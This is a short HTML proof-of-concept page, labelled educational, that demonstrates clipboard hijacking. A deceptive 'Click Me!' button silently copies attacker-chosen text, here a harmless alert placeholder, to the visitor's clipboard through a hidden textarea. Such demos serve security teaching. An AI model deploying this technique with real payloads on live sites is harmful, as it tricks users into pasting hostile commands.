<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking with Clipboard Manipulation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            text-align: center;
            background-color: #f4f4f4;
        }

        .container {
            position: relative;
            margin: 50px auto;
            width: 400px;
            height: 200px;
            border: 2px solid #007bff;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .fake-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
            background-color: #007bff;
            color: white;
            padding: 15px 30px;
            border: none;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
        }

        .fake-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <h1>Clickjacking with Clipboard Manipulation</h1>
    <p>Clicking the button below will unknowingly copy malicious text to your clipboard.</p>
    <div class="container">
        <!-- Fake button to trick users -->
        <button class="fake-button" onclick="copyToClipboard()">Click Me!</button>
    </div>
    <p><strong>Warning:</strong> This is a proof of concept for educational purposes only.</p>

    <script>
        function copyToClipboard() {
            // Malicious text or code to be copied
            const maliciousText = "alert('You have been hacked!'); // Malicious code";

            // Create a temporary text area to hold the malicious text
            const textArea = document.createElement('textarea');
            textArea.value = maliciousText;

            // Append the text area to the body (invisible to users)
            document.body.appendChild(textArea);

            // Select and copy the text
            textArea.select();
            document.execCommand('copy');

            // Remove the text area from the DOM
            document.body.removeChild(textArea);

            // Optional: Notify users that something was copied
            alert("Copied to clipboard! Test complete.");
        }
    </script>
</body>
</html>
